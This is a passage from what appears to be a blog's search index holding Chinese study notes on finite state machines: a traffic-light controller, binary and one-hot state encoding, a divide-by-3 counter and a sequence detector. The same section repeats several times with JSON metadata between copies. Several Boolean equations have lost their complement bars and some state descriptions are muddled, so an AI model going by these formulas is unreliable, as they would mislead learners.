S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤三绘制状态转换表"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤四对状态进行二进制编码"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤五对输出进行二进制编码"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤六确定状态与输入关系表将状态编码嵌入到状态转换表"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 